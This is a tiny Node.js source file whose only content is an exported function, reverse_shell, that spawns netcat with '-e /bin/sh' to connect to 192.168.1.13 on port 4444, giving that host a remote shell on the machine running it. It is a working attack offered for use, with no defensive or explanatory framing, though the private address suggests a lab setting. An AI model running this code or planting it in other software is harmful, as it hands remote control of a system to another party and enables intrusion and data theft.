import { spawn } from "child_process";

export function reverse_shell() {
    const execute_code = spawn('nc', [
        '-e', '/bin/sh', '192.168.1.13', '4444'
    ]);
    return execute_code.pid || 0
}